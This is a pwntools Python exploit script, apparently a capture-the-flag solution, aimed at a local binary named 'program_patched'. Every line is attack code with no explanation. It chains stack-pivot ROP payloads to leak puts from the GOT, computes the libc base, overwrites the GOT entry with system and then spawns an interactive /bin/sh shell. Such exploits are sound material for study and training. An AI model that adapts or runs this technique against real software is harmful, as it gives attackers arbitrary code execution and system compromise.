from pwn import * 

binary = "./program_patched"

elf = ELF(binary)
libc = ELF("./libc.so.6")

context.binary = elf 
p = process(binary)
s = '''
b * bare+61
b* puts+251
b* my_read+39
'''
# f"b* {pop_rdi}" + s
gdb.attach(p,s)
p.recvuntil(b"What is your name?\n")

pop_rdi_ret = 0x00000000004007f3

leave_ret =  0x00000000004006de
writable_addr = 0x601000 +0x500

buf1 = 0x601000 + 0x700
buf2 = 0x601000 + 0x800
buf3 = 0x601000 + 0x900

payload = flat(
    b'A'* 0x20, # up to rbp
    buf1, # saved rbp

    # prepare and wait for payload input for the next buffer 
    pop_rdi_ret,
    buf1,
    elf.sym['my_read'],

    #goes into the next buffer
    leave_ret

)

p.send(payload)

payload2 = flat(
    buf2, # rbp to be restored, would be popped 
    pop_rdi_ret,
    elf.got['puts'],
    elf.plt['puts'],


        # prepare and wait for payload input for the next buffer 
    pop_rdi_ret,
    buf2,
    elf.sym['my_read'],

    #goes into the next buffer
    leave_ret
)

p.send(payload2) # received by my_read in previous payload

puts = int.from_bytes(p.recvuntil(b'\x7f'), 'little')
print(hex(puts))

print(hex(libc.sym['puts']))
libc.address = puts - libc.sym['puts']
print(hex(libc.address))

payload3 = flat(
    buf3, # dummy rbp, would be popped 
    pop_rdi_ret,
    elf.got['puts'],
    elf.sym['my_read'], # enter system address,  


    pop_rdi_ret,
    buf3,
    elf.sym['my_read'],

    #goes into the next buffer
    leave_ret
)

p.send(payload3)

p.send(p64(libc.sym['system']))

payload4 = flat(
    b'A'*8, # dummy rbp, would be popped 
    pop_rdi_ret, 
    writable_addr,   
    elf.sym['my_read'],

    pop_rdi_ret,
    writable_addr,
    elf.plt['puts']
)
p.send(payload4)

p.send(b'/bin/sh\x00')



p.interactive()